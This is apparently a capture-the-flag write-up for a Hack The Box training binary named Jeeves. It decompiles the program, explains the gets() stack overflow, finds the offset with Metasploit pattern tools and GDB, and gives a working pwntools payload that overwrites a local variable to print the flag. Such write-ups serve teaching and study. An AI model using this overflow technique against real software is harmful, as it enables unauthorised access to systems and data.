# HTB/Track/Binexp/Jeeves
Given a binary that asks for your name, then prints it out.

## Static analysis

Decompilation of the main function in Ghidra shows that the method for taking user input is `gets()`.

```c
undefined8 main(void)

{
  char local_48 [44];
  int local_1c;
  void *local_18;
  int local_c;
  
  local_c = -0x21523f2d;
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {    // [1]
    local_18 = malloc(0x100);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}
```
### Vulnerability

`gets()` is an insecure function as it carries on writing beyond the bounds of the variable's allocated buffer. This means it is possible to overwrite other parts of the stack.

At marker [1] in the above code, an if statement is checking whether the value of `local_c` is `0x1337bab3`. If true, allocates 100 bytes to a section of memory and returns a pointer with `malloc()`, and then sets the variable local_1c to the flag.txt file, which is then read into the allocated memory and printed.

The `gets()` function usage enables the possibility of stack corruption, specifically to overwrite the contents of `local_c`, which allows us to access the flag printing functionality.

### Test Input

`msf-pattern_create -l 72` may suffice in length.

```bash
└─$ msf-pattern_create -l 72        
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
```
A Python exploit template is then created for the binary using pwntools:

```bash
└─$ pwn template --host 300.300.300.300 --port 1234 ./jeeves >> solution.py
```
The exploit is modified to deliver the padding string as input to the binary on execution:
```python
io = start()

padding = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3"
io.sendline(padding)

io.interactive()
```
## Dynamic Analysis
Dynamic analysis of the binary can then be done locally using the LOCAL and GDB parameters with the exploit script, respectively.

`./solution.py LOCAL GDB`

```bash
Temporary breakpoint 1, 0x00005650bfc111f1 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb) i r
rax            0x0                 0
rbx            0x7fffcbaf0438      140736610632760
rcx            0x0                 0
rdx            0x0                 0
rsi            0x5650bfc582a0      94904814764704
rdi            0x7fffcbaefd80      140736610631040
rbp            0x3363413263413163  0x3363413263413163
rsp            0x7fffcbaf0338      0x7fffcbaf0338
r8             0x5650bfc582c4      94904814764740
r9             0x7f48144515c0      139947554444736
r10            0x0                 0
r11            0x202               514
r12            0x0                 0
r13            0x7fffcbaf0448      140736610632776
r14            0x0                 0
r15            0x7f4814515020      139947555246112
rip            0x0                 0x0
eflags         0x10216             [ PF AF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
```
## Locating local_c
The contents of rbp were checked with `msf-pattern_offset` to determine the offset of rbp.

```bash
└─$ msf-pattern_offset -q 0x3363413263413163                                   
[*] Exact match at offset 64
```
As the `rbp` register comes after the local variables on the stack, some padding will need to be removed so that `local_c` can be overwritten with the correct value, instead of the padding. Therefore 60 bytes of padding will need to be used, followed by `0x1337bab3` in little endian to match the endianness of the system.

## Exploitation

### Final payload
```python
io = start()
padding = b"A"*60
leetbabe = p32(0x1337bab3,endian="little")
io.sendline(padding+leetbabe)
io.interactive()
```

### Flag output

```bashtxt
[*] Switching to interactive mode
Hello, good sir!
May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13 hope you have a good day!
Pleased to make your acquaintance. Here's a small gift: [flag]
```